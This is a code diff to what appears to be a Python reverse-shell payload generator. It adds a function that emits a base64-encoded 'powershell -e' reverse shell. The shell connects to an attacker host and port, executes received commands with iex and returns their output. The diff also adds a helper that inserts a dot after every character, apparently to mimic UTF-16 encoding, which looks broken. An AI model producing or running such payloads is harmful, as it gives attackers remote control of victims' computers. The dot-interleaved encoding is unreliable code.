@@ -1,3 +1,5 @@
+import base64
+
 def push_payload(lhost,lport,payload):
     
     if "{lport2}" in payload:
@@ -15,6 +17,27 @@ def push_payload(lhost,lport,payload):
         payload = payload.replace("{lport}",lport)
 
         print(payload)
+
+
+def push_payload_base64(init,lhost,lport,payload):
+    
+    lhost = mix_down(lhost)
+    lport = mix_down(lport)
+
+    payload = payload.replace("{lhost}",lhost)
+    payload = payload.replace("{lport}",lport)
+
+    payload = base64.b64encode(payload.encode())
+    payload = init + payload.decode()
+
+    print(payload)
+
+def mix_down(self):
+
+    text = ""
+    for i in self:
+        text += i + "."
+    return text
 
 
 
@@ -220,6 +243,13 @@ def Powershell(lhost,lport):
 
     """
     push_payload(lhost,lport,payload)
+
+def Powershell_base64(lhost,lport):
+
+    init = "powershell -e "
+
+    payload = """$.c.l.i.e.n.t. .=. .N.e.w.-.O.b.j.e.c.t. .S.y.s.t.e.m...N.e.t...S.o.c.k.e.t.s...T.C.P.C.l.i.e.n.t.(.".{lhost}".,.{lport}).;.$.s.t.r.e.a.m. .=. .$.c.l.i.e.n.t...G.e.t.S.t.r.e.a.m.(.).;.[.b.y.t.e.[.].].$.b.y.t.e.s. .=. .0.....6.5.5.3.5.|.%.{.0.}.;.w.h.i.l.e.(.(.$.i. .=. .$.s.t.r.e.a.m...R.e.a.d.(.$.b.y.t.e.s.,. .0.,. .$.b.y.t.e.s...L.e.n.g.t.h.).). .-.n.e. .0.).{.;.$.d.a.t.a. .=. .(.N.e.w.-.O.b.j.e.c.t. .-.T.y.p.e.N.a.m.e. .S.y.s.t.e.m...T.e.x.t...A.S.C.I.I.E.n.c.o.d.i.n.g.)...G.e.t.S.t.r.i.n.g.(.$.b.y.t.e.s.,.0.,. .$.i.).;.$.s.e.n.d.b.a.c.k. .=. .(.i.e.x. .$.d.a.t.a. .2.>.&.1. .|. .O.u.t.-.S.t.r.i.n.g. .).;.$.s.e.n.d.b.a.c.k.2. .=. .$.s.e.n.d.b.a.c.k. .+. .".P.S. .". .+. .(.p.w.d.)...P.a.t.h. .+. .".>. .".;.$.s.e.n.d.b.y.t.e. .=. .(.[.t.e.x.t...e.n.c.o.d.i.n.g.].:.:.A.S.C.I.I.)...G.e.t.B.y.t.e.s.(.$.s.e.n.d.b.a.c.k.2.).;.$.s.t.r.e.a.m...W.r.i.t.e.(.$.s.e.n.d.b.y.t.e.,.0.,.$.s.e.n.d.b.y.t.e...L.e.n.g.t.h.).;.$.s.t.r.e.a.m...F.l.u.s.h.(.).}.;.$.c.l.i.e.n.t...C.l.o.s.e.(.)."""
+    push_payload_base64(init,lhost,lport,payload)
 
 def Awk(lhost,lport):
 
